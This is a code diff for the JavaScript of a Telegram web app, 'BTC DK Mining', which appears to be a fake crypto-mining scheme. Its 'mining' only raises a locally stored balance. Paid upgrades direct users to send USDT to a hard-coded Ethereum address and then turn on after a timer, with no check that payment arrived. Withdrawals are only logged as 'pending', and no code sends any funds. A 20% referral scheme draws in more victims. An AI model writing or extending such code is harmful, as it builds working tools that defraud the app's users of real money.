@@ -1,17 +1,23 @@
+// ============================================
 // BTC DK MINING - PROFESSIONAL EDITION
-// COMPLETE FIXED VERSION - All functions working
-// Starting Balance: 0.000000000000000 BTC
+// COMPLETE - 0.000000000000000 BTC STARTING
+// ============================================
 
 // ============================================
 // TELEGRAM WEB APP INITIALIZATION
 // ============================================
 const tg = window.Telegram?.WebApp;
+if (tg) {
+    tg.expand();
+    tg.ready();
+    console.log('Telegram WebApp initialized');
+}
 
 // ============================================
 // GAME STATE - 0.000000000000000 BTC STARTING
 // ============================================
 const gameState = {
-    // Balance & Mining - 15 decimal places
+    // Balance & Mining
     balance: 0.000000000000000,
     totalMined: 0.000000000000000,
     miningSpeed: 9,
@@ -35,9 +41,7 @@ const gameState = {
     
     // Payment Configuration
     payments: {
-        ethAddress: "0x742d35Cc6634C0532925a3b844Bc9e34F3bA2E1c",
-        network: "ERC-20",
-        confirmations: 3
+        ethAddress: "0x742d35Cc6634C0532925a3b844Bc9e34F3bA2E1c"
     },
     
     // Referral System
@@ -80,11 +84,10 @@ function loadGameState() {
         const saved = localStorage.getItem('btcDKMining_pro');
         if (saved) {
             const parsed = JSON.parse(saved);
-            
-            if (parsed.referral) gameState.referral = parsed.referral;
-            if (parsed.upgrades) gameState.upgrades = parsed.upgrades;
             if (parsed.balance !== undefined) gameState.balance = parsed.balance;
             if (parsed.totalMined !== undefined) gameState.totalMined = parsed.totalMined;
+            if (parsed.upgrades) gameState.upgrades = parsed.upgrades;
+            if (parsed.referral) gameState.referral = parsed.referral;
             if (parsed.withdrawalHistory) gameState.withdrawalHistory = parsed.withdrawalHistory;
             
             if (parsed.miningSessionEnd && new Date(parsed.miningSessionEnd) > new Date()) {
@@ -97,10 +100,10 @@ function loadGameState() {
         console.error('Error loading state:', e);
     }
     
-    initReferral();
     updateUI();
     updateUSDValues();
     updateReferralUI();
+    updateWithdrawalHistory();
 }
 
 function saveGameState() {
@@ -109,59 +112,6 @@ function saveGameState() {
     } catch (e) {
         console.error('Error saving state:', e);
     }
-}
-
-// ============================================
-// REFERRAL FUNCTIONS
-// ============================================
-function initReferral() {
-    try {
-        if (tg?.initDataUnsafe?.start_param) {
-            const param = tg.initDataUnsafe.start_param;
-            if (param.startsWith('ref_')) {
-                const referrerCode = 'BTC-' + param.replace('ref_', '');
-                if (referrerCode !== gameState.referral.code) {
-                    gameState.referral.referredBy = referrerCode;
-                    localStorage.setItem('btc_referred_by', referrerCode);
-                    
-                    setTimeout(() => {
-                        if (tg) tg.showAlert('🎁 You were referred by a friend!\nYou both get 20% mining bonus');
-                    }, 2000);
-                }
-            }
-        }
-        
-        const savedReferrer = localStorage.getItem('btc_referred_by');
-        if (savedReferrer && !gameState.referral.referredBy) {
-            gameState.referral.referredBy = savedReferrer;
-        }
-    } catch (e) {
-        console.error('Referral init error:', e);
-    }
-}
-
-function processReferralCommission(miningAmount) {
-    if (gameState.referral.referredBy) {
-        const commission = miningAmount * 0.20;
-        gameState.referral.earnings += commission;
-        gameState.balance = parseFloat((gameState.balance + commission).toFixed(15));
-        updateReferralUI();
-        return commission;
-    }
-    return 0;
-}
-
-function updateReferralUI() {
-    updateElement('referral-code', gameState.referral.code);
-    
-    const botUsername = 'Btcdkminingbot';
-    const cleanCode = gameState.referral.code.replace('BTC-', '');
-    updateElement('referral-link', `https://t.me/${botUsername}?start=ref_${cleanCode}`);
-    
-    updateElement('referral-earnings', gameState.referral.earnings.toFixed(8));
-    updateElement('referral-count', `${gameState.referral.count} referrals`);
-    updateElement('referral-total', gameState.referral.count);
-    updateElement('referral-active', `${gameState.referral.activeCount} active`);
 }
 
 // ============================================
@@ -197,29 +147,47 @@ function updateUI() {
     updateElement('current-multiplier', currentMultiplier);
     updateElement('next-multiplier', nextMultiplier);
     
+    // Upgrade costs
+    updateElement('speed-cost', `$${gameState.upgrades.speedCost.toFixed(2)}`);
+    updateElement('efficiency-cost', `$${gameState.upgrades.efficiencyCost.toFixed(2)}`);
+    
     // Mining button
     const mineBtn = document.getElementById('mine-btn');
     if (mineBtn) {
-        if (gameState.isAutoMining) {
-            mineBtn.innerHTML = '⚡ Mining Session Active';
-            mineBtn.disabled = true;
+        mineBtn.innerHTML = gameState.isAutoMining ? '⚡ Mining Session Active' : '⚡ Start 2-Hour Mining Session';
+        mineBtn.disabled = gameState.isAutoMining;
+    }
+    
+    // Speed upgrade button
+    const speedBtn = document.getElementById('speed-btn');
+    if (speedBtn) {
+        if (gameState.upgrades.speedLevel >= gameState.upgrades.maxSpeedLevel) {
+            speedBtn.innerHTML = '✓ Maximum Level Reached';
+            speedBtn.disabled = true;
         } else {
-            mineBtn.innerHTML = '⚡ Start 2-Hour Mining Session';
-            mineBtn.disabled = false;
+            speedBtn.innerHTML = `Purchase Speed Upgrade - $${gameState.upgrades.speedCost.toFixed(2)}`;
+            speedBtn.disabled = false;
         }
     }
     
-    updateUpgradeButtons();
+    // Efficiency upgrade button
+    const efficiencyBtn = document.getElementById('efficiency-btn');
+    if (efficiencyBtn) {
+        if (gameState.upgrades.efficiencyLevel >= gameState.upgrades.maxEfficiencyLevel) {
+            efficiencyBtn.innerHTML = '✓ Maximum Level Reached';
+            efficiencyBtn.disabled = true;
+        } else {
+            efficiencyBtn.innerHTML = `Purchase Efficiency Upgrade - $${gameState.upgrades.efficiencyCost.toFixed(2)}`;
+            efficiencyBtn.disabled = false;
+        }
+    }
+    
+    // Timer display
     updateTimerDisplay();
 }
 
-// ============================================
-// USD VALUE CONVERSION
-// ============================================
-const BTC_TO_USD = 45000;
-
 function updateUSDValues() {
-    const balanceUSD = gameState.balance * BTC_TO_USD;
+    const balanceUSD = gameState.balance * 45000;
     updateElement('balance-usd', balanceUSD.toFixed(8));
     updateElement('available-usd', balanceUSD.toFixed(8));
 }
@@ -227,7 +195,7 @@ function updateUSDValues() {
 // ============================================
 // MINING FUNCTIONS
 // ============================================
-function startMining() {
+window.startMining = function() {
     if (gameState.isAutoMining) {
         if (tg) tg.showAlert('Mining session already active');
         return;
@@ -239,10 +207,10 @@ function startMining() {
     
     startMiningSession();
     saveGameState();
-    
-    if (tg) tg.showAlert('✓ 2-hour mining session initiated\nMining will continue automatically');
     updateUI();
-}
+    
+    if (tg) tg.showAlert('✓ 2-hour mining session started');
+};
 
 function startMiningSession() {
     if (gameState.miningInterval) clearInterval(gameState.miningInterval);
@@ -252,10 +220,7 @@ function startMiningSession() {
     const miningAmount = gameState.baseMiningAmount * Math.pow(2, gameState.upgrades.efficiencyLevel);
     
     gameState.miningInterval = setInterval(() => {
-        if (!gameState.isAutoMining) {
-            clearInterval(gameState.miningInterval);
-            return;
-        }
+        if (!gameState.isAutoMining) return;
         
         if (new Date() >= new Date(gameState.miningSessionEnd)) {
             endMiningSession();
@@ -267,10 +232,14 @@ function startMiningSession() {
         gameState.totalMined = parseFloat((gameState.totalMined + miningAmount).toFixed(15));
         
         // Process referral commission
-        processReferralCommission(miningAmount);
+        if (gameState.referral.referredBy) {
+            const commission = miningAmount * 0.20;
+            gameState.referral.earnings += commission;
+        }
         
         updateUI();
         updateUSDValues();
+        updateReferralUI();
         saveGameState();
         animateProgress();
         
@@ -296,34 +265,34 @@ function endMiningSession() {
     updateUI();
     saveGameState();
     
-    if (tg) tg.showAlert('⏹ Mining session completed\nStart a new session to continue');
+    if (tg) tg.showAlert('⏹ Mining session completed');
 }
 
 function animateProgress() {
-    const progressBar = document.getElementById('progress');
+    const progress = document.getElementById('progress');
     const progressText = document.getElementById('progress-text');
     
-    if (progressBar && progressText) {
-        progressBar.style.transition = 'none';
-        progressBar.style.width = '0%';
+    if (!progress) return;
+    
+    progress.style.transition = 'none';
+    progress.style.width = '0%';
+    
+    const miningSpeed = Math.max(3, gameState.miningSpeed - (gameState.upgrades.speedLevel * 3));
+    
+    setTimeout(() => {
+        progress.style.transition = `width ${miningSpeed}s linear`;
+        progress.style.width = '100%';
         
-        const miningSpeed = Math.max(3, gameState.miningSpeed - (gameState.upgrades.speedLevel * 3));
-        
-        setTimeout(() => {
-            progressBar.style.transition = `width ${miningSpeed}s linear`;
-            progressBar.style.width = '100%';
-            
-            let progress = 0;
-            const interval = setInterval(() => {
-                progress += 1;
-                progressText.textContent = `${progress}%`;
-                if (progress >= 100) {
-                    clearInterval(interval);
-                    progressText.textContent = '0%';
-                }
-            }, miningSpeed * 10);
-        }, 10);
-    }
+        let p = 0;
+        const interval = setInterval(() => {
+            p += 1;
+            if (progressText) progressText.textContent = `${p}%`;
+            if (p >= 100) {
+                clearInterval(interval);
+                if (progressText) progressText.textContent = '0%';
+            }
+        }, miningSpeed * 10);
+    }, 10);
 }
 
 function updateTimerDisplay() {
@@ -334,9 +303,7 @@ function updateTimerDisplay() {
     if (!timerDisplay) return;
     
     if (gameState.isAutoMining && gameState.miningSessionEnd) {
-        const now = new Date();
-        const end = new Date(gameState.miningSessionEnd);
-        const diff = end - now;
+        const diff = new Date(gameState.miningSessionEnd) - new Date();
         
         if (diff <= 0) {
             endMiningSession();
@@ -360,32 +327,25 @@ function updateTimerDisplay() {
 // ============================================
 // UPGRADE FUNCTIONS
 // ============================================
-function buyUpgrade(type) {
+window.buyUpgrade = function(type) {
     if (!tg) {
-        alert('Opening upgrade dialog...');
+        alert('Opening upgrade...');
         return;
     }
     
     if (type === 'speed') {
         if (gameState.upgrades.speedLevel >= gameState.upgrades.maxSpeedLevel) {
-            tg.showAlert('Maximum speed level reached (10/10)');
+            tg.showAlert('Maximum speed level reached');
             return;
         }
         
-        const cost = gameState.upgrades.speedCost;
-        const currentSpeed = Math.max(3, gameState.miningSpeed - (gameState.upgrades.speedLevel * 3));
-        const nextSpeed = Math.max(3, currentSpeed - 3);
-        
         tg.showConfirm(
-            `⚡ Speed Acceleration Upgrade\n\n` +
-            `Investment: $${cost} USDT\n` +
-            `Current Speed: ${currentSpeed}s\n` +
-            `New Speed: ${nextSpeed}s\n` +
-            `Level: ${gameState.upgrades.speedLevel + 1}/10\n\n` +
-            `Send $${cost} USDT (ERC-20) to:\n${gameState.payments.ethAddress}`,
+            `⚡ Speed Upgrade\n\n` +
+            `Cost: $${gameState.upgrades.speedCost} USDT\n` +
+            `Send to:\n${gameState.payments.ethAddress}`,
             (confirmed) => {
                 if (confirmed) {
-                    tg.showAlert(`⏳ Transaction submitted! Upgrade will activate within 60 seconds.`);
+                    tg.showAlert(`⏳ Processing upgrade...`);
                     
                     setTimeout(() => {
                         gameState.upgrades.speedLevel++;
@@ -396,11 +356,10 @@ function buyUpgrade(type) {
                         }
                         
                         updateUI();
-                        updateUpgradeButtons();
                         saveGameState();
                         
-                        tg.showAlert(`✓ Speed Acceleration Level ${gameState.upgrades.speedLevel} Activated!\nMining speed: ${Math.max(3, gameState.miningSpeed - (gameState.upgrades.speedLevel * 3))}s per cycle`);
-                    }, 3000);
+                        tg.showAlert(`✓ Speed Level ${gameState.upgrades.speedLevel} Activated`);
+                    }, 2000);
                 }
             }
         );
@@ -408,73 +367,64 @@ function buyUpgrade(type) {
     
     if (type === 'efficiency') {
         if (gameState.upgrades.efficiencyLevel >= gameState.upgrades.maxEfficiencyLevel) {
-            tg.showAlert('Maximum efficiency level reached (5/5)');
+            tg.showAlert('Maximum efficiency level reached');
             return;
         }
         
-        const cost = gameState.upgrades.efficiencyCost;
-        const currentMultiplier = Math.pow(2, gameState.upgrades.efficiencyLevel);
-        const nextMultiplier = Math.pow(2, gameState.upgrades.efficiencyLevel + 1);
-        
         tg.showConfirm(
-            `💎 Hashrate Multiplier Upgrade\n\n` +
-            `Investment: $${cost} USDT\n` +
-            `Current Multiplier: ${currentMultiplier}x\n` +
-            `New Multiplier: ${nextMultiplier}x\n` +
-            `Level: ${gameState.upgrades.efficiencyLevel + 1}/5\n\n` +
-            `Send $${cost} USDT (ERC-20) to:\n${gameState.payments.ethAddress}`,
+            `💎 Efficiency Upgrade\n\n` +
+            `Cost: $${gameState.upgrades.efficiencyCost} USDT\n` +
+            `Send to:\n${gameState.payments.ethAddress}`,
             (confirmed) => {
                 if (confirmed) {
-                    tg.showAlert(`⏳ Transaction submitted! Upgrade will activate within 60 seconds.`);
+                    tg.showAlert(`⏳ Processing upgrade...`);
                     
                     setTimeout(() => {
                         gameState.upgrades.efficiencyLevel++;
                         gameState.upgrades.efficiencyCost = Math.min(199.99, gameState.upgrades.efficiencyCost + 15);
                         
                         updateUI();
-                        updateUpgradeButtons();
                         saveGameState();
                         
-                        tg.showAlert(`✓ Hashrate Multiplier Level ${gameState.upgrades.efficiencyLevel} Activated!\nOutput: ${Math.pow(2, gameState.upgrades.efficiencyLevel)}x per cycle`);
-                    }, 3000);
+                        tg.showAlert(`✓ Efficiency Level ${gameState.upgrades.efficiencyLevel} Activated`);
+                    }, 2000);
                 }
             }
         );
     }
+};
+
+// ============================================
+// REFERRAL FUNCTIONS
+// ============================================
+function updateReferralUI() {
+    updateElement('referral-code', gameState.referral.code);
+    
+    const cleanCode = gameState.referral.code.replace('BTC-', '');
+    updateElement('referral-link', `https://t.me/Btcdkminingbot?start=ref_${cleanCode}`);
+    
+    updateElement('referral-earnings', gameState.referral.earnings.toFixed(8));
+    updateElement('referral-count', `${gameState.referral.count} referrals`);
+    updateElement('referral-total', gameState.referral.count);
+    updateElement('referral-active', `${gameState.referral.activeCount} active`);
 }
 
-function updateUpgradeButtons() {
-    const speedBtn = document.getElementById('speed-btn');
-    if (speedBtn) {
-        if (gameState.upgrades.speedLevel >= gameState.upgrades.maxSpeedLevel) {
-            speedBtn.innerHTML = '✓ Maximum Level Reached';
-            speedBtn.disabled = true;
-        } else {
-            speedBtn.innerHTML = `Purchase Speed Upgrade - $${gameState.upgrades.speedCost.toFixed(2)}`;
-            speedBtn.disabled = false;
-        }
-    }
-    
-    const efficiencyBtn = document.getElementById('efficiency-btn');
-    if (efficiencyBtn) {
-        if (gameState.upgrades.efficiencyLevel >= gameState.upgrades.maxEfficiencyLevel) {
-            efficiencyBtn.innerHTML = '✓ Maximum Level Reached';
-            efficiencyBtn.disabled = true;
-        } else {
-            efficiencyBtn.innerHTML = `Purchase Efficiency Upgrade - $${gameState.upgrades.efficiencyCost.toFixed(2)}`;
-            efficiencyBtn.disabled = false;
-        }
-    }
-}
+window.copyReferralCode = function() {
+    navigator.clipboard.writeText(gameState.referral.code);
+    if (tg) tg.showAlert('✓ Referral code copied');
+};
+
+window.copyReferralLink = function() {
+    const cleanCode = gameState.referral.code.replace('BTC-', '');
+    navigator.clipboard.writeText(`https://t.me/Btcdkminingbot?start=ref_${cleanCode}`);
+    if (tg) tg.showAlert('✓ Referral link copied');
+};
 
 // ============================================
 // WITHDRAWAL FUNCTIONS
 // ============================================
-function withdraw() {
-    if (!tg) {
-        alert('Opening withdrawal dialog...');
-        return;
-    }
+window.withdraw = function() {
+    if (!tg) return;
     
     const amountInput = document.getElementById('withdraw-amount');
     const walletInput = document.getElementById('wallet-address');
@@ -488,12 +438,12 @@ function withdraw() {
     }
     
     if (amount > gameState.balance) {
-        tg.showAlert(`Insufficient balance\nAvailable: ${gameState.balance.toFixed(8)} BTC`);
+        tg.showAlert(`Insufficient balance`);
         return;
     }
     
     if (!wallet || wallet.length < 26) {
-        tg.showAlert('Please enter a valid Bitcoin wallet address');
+        tg.showAlert('Invalid Bitcoin address');
         return;
     }
     
@@ -501,144 +451,105 @@ function withdraw() {
     const netAmount = amount - fee;
     
     if (netAmount <= 0) {
-        tg.showAlert('Amount too small after network fee');
+        tg.showAlert('Amount too small');
         return;
     }
     
     tg.showConfirm(
-        `💰 Withdrawal Request\n\n` +
-        `Amount: ${amount.toFixed(8)} BTC\n` +
-        `Network Fee: ${fee.toFixed(8)} BTC\n` +
-        `You Receive: ${netAmount.toFixed(8)} BTC\n` +
-        `Destination: ${wallet.substring(0, 10)}...${wallet.substring(wallet.length - 6)}\n\n` +
-        `Processing time: 1-24 hours`,
+        `Withdraw ${amount.toFixed(8)} BTC?\n` +
+        `Fee: ${fee} BTC\n` +
+        `You receive: ${netAmount.toFixed(8)} BTC`,
         (confirmed) => {
             if (confirmed) {
-                processWithdrawal(amount, netAmount, wallet, fee);
+                gameState.balance = parseFloat((gameState.balance - amount).toFixed(15));
+                
+                gameState.withdrawalHistory.unshift({
+                    id: Date.now(),
+                    date: new Date().toISOString(),
+                    netAmount: netAmount,
+                    status: 'pending'
+                });
+                
+                updateUI();
+                updateUSDValues();
+                updateWithdrawalHistory();
+                saveGameState();
+                
+                if (amountInput) amountInput.value = '';
+                if (walletInput) walletInput.value = '';
+                updateReceiveAmount();
+                
+                tg.showAlert(`✓ Withdrawal submitted`);
             }
         }
     );
-}
-
-function processWithdrawal(amount, netAmount, wallet, fee) {
-    gameState.balance = parseFloat((gameState.balance - amount).toFixed(15));
-    
-    const withdrawal = {
-        id: Date.now(),
-        date: new Date().toISOString(),
-        amount: amount,
-        fee: fee,
-        netAmount: netAmount,
-        wallet: wallet,
-        status: 'pending'
-    };
-    
-    gameState.withdrawalHistory.unshift(withdrawal);
-    
-    updateUI();
-    updateUSDValues();
-    updateWithdrawalHistory();
-    saveGameState();
-    
-    const amountInput = document.getElementById('withdraw-amount');
-    const walletInput = document.getElementById('wallet-address');
-    if (amountInput) amountInput.value = '';
-    if (walletInput) walletInput.value = '';
-    updateReceiveAmount();
-    
-    tg.showAlert(
-        `✓ Withdrawal Request Submitted\n\n` +
-        `Amount: ${netAmount.toFixed(8)} BTC\n` +
-        `Status: Pending\n` +
-        `Estimated completion: 1-24 hours`
-    );
-}
+};
 
 function updateWithdrawalHistory() {
-    const historyList = document.getElementById('history-list');
-    if (!historyList) return;
+    const list = document.getElementById('history-list');
+    if (!list) return;
     
     if (gameState.withdrawalHistory.length === 0) {
-        historyList.innerHTML = '<div style="text-align: center; padding: 30px; background: rgba(255,255,255,0.02); border-radius: 16px; color: #5a6a78;">No withdrawal history</div>';
+        list.innerHTML = '<div style="text-align: center; padding: 25px; background: rgba(255,255,255,0.02); border-radius: 16px; color: #5a6a78;">No withdrawal history</div>';
         return;
     }
     
     let html = '';
     gameState.withdrawalHistory.slice(0, 5).forEach(item => {
-        const date = new Date(item.date).toLocaleDateString('en-US', {
-            month: 'short',
-            day: 'numeric',
-            hour: '2-digit',
-            minute: '2-digit'
-        });
-        
+        const date = new Date(item.date).toLocaleDateString();
         html += `
             <div class="history-item">
                 <div>
                     <div style="font-size: 14px; font-weight: 600; color: white;">${item.netAmount.toFixed(8)} BTC</div>
-                    <div style="font-size: 12px; color: #5a6a78;">${date}</div>
+                    <div style="font-size: 11px; color: #5a6a78;">${date}</div>
                 </div>
-                <span class="status-badge status-pending">Pending</span>
+                <span class="status-badge">Pending</span>
             </div>
         `;
     });
     
-    historyList.innerHTML = html;
+    list.innerHTML = html;
 }
 
-// ============================================
-// UTILITY FUNCTIONS (EXPOSED TO HTML)
-// ============================================
-function copyAddress() {
-    navigator.clipboard.writeText(gameState.payments.ethAddress).then(() => {
-        if (tg) tg.showAlert('✓ Address copied to clipboard');
-    });
-}
-
-function copyReferralCode() {
-    navigator.clipboard.writeText(gameState.referral.code).then(() => {
-        if (tg) tg.showAlert('✓ Referral code copied');
-    });
-}
-
-function copyReferralLink() {
-    const botUsername = 'Btcdkminingbot';
-    const cleanCode = gameState.referral.code.replace('BTC-', '');
-    const link = `https://t.me/${botUsername}?start=ref_${cleanCode}`;
-    
-    navigator.clipboard.writeText(link).then(() => {
-        if (tg) tg.showAlert('✓ Referral link copied\nShare with friends to earn 20%');
-    });
-}
-
-function setMaxWithdraw() {
+window.setMaxWithdraw = function() {
     const input = document.getElementById('withdraw-amount');
     if (input) {
         input.value = gameState.balance.toFixed(8);
         updateReceiveAmount();
     }
-}
+};
 
 function updateReceiveAmount() {
     const amount = parseFloat(document.getElementById('withdraw-amount')?.value || '0');
     const receive = amount - 0.0001;
     const receiveEl = document.getElementById('receive-amount');
+    
     if (receiveEl) {
         receiveEl.textContent = receive > 0 ? receive.toFixed(8) + ' BTC' : '0.00000000 BTC';
     }
 }
 
 // ============================================
-// EXPOSE ALL FUNCTIONS TO GLOBAL SCOPE
+// UTILITY FUNCTIONS
 // ============================================
-window.startMining = startMining;
-window.buyUpgrade = buyUpgrade;
-window.withdraw = withdraw;
-window.copyAddress = copyAddress;
-window.copyReferralCode = copyReferralCode;
-window.copyReferralLink = copyReferralLink;
-window.setMaxWithdraw = setMaxWithdraw;
-window.updateReceiveAmount = updateReceiveAmount;
+window.copyAddress = function() {
+    navigator.clipboard.writeText(gameState.payments.ethAddress);
+    if (tg) tg.showAlert('✓ Address copied');
+};
+
+// ============================================
+// TAB SWITCHING
+// ============================================
+document.querySelectorAll('.tab').forEach(tab => {
+    tab.addEventListener('click', function() {
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        this.classList.add('active');
+        
+        const tabId = this.getAttribute('data-tab');
+        document.querySelectorAll('.tab-pane').forEach(pane => pane.classList.add('hidden'));
+        document.getElementById(`${tabId}-tab`).classList.remove('hidden');
+    });
+});
 
 // ============================================
 // AUTO-SAVE
@@ -649,50 +560,28 @@ setInterval(saveGameState, 30000);
 // INITIALIZATION
 // ============================================
 document.addEventListener('DOMContentLoaded', function() {
-    console.log('BTC DK Mining - Initializing...');
+    console.log('BTC DK Mining initializing...');
     
-    // Initialize Telegram
-    if (tg) {
-        tg.expand();
-        tg.ready();
-        console.log('Telegram WebApp initialized');
-    }
-    
-    // Load saved state
-    loadGameState();
-    
-    // Setup withdrawal input listener
+    // Withdrawal amount listener
     const withdrawInput = document.getElementById('withdraw-amount');
     if (withdrawInput) {
         withdrawInput.addEventListener('input', updateReceiveAmount);
     }
     
-    // Verify all functions are exposed
-    console.log('Functions exposed:', {
-        startMining: typeof window.startMining,
-        buyUpgrade: typeof window.buyUpgrade,
-        withdraw: typeof window.withdraw,
-        copyAddress: typeof window.copyAddress,
-        copyReferralCode: typeof window.copyReferralCode,
-        copyReferralLink: typeof window.copyReferralLink
-    });
+    // Load saved state
+    loadGameState();
     
     // Welcome message
-    if (!localStorage.getItem('btcDKMining_welcome')) {
+    if (!localStorage.getItem('btcDKMining_welcome') && tg) {
         setTimeout(() => {
-            if (tg) {
-                tg.showAlert(
-                    '⚡ BTC DK MINING - Professional Edition\n\n' +
-                    '• Starting balance: 0.000000000000000 BTC\n' +
-                    '• 2-Hour mining sessions\n' +
-                    '• USDT upgrades (ERC-20)\n' +
-                    '• Minimum withdrawal: 0.001 BTC\n' +
-                    '• Network fee: 0.0001 BTC\n\n' +
-                    '🎁 Referral Program: 20% lifetime commission\n\n' +
-                    '✓ All systems ready!'
-                );
-            }
+            tg.showAlert(
+                '⚡ BTC DK MINING\n\n' +
+                'Starting: 0.000000000000000 BTC\n' +
+                '2H Sessions • 20% Referral • USDT Upgrades'
+            );
             localStorage.setItem('btcDKMining_welcome', 'true');
-        }, 1500);
+        }, 1000);
     }
+    
+    console.log('All functions ready');
 });
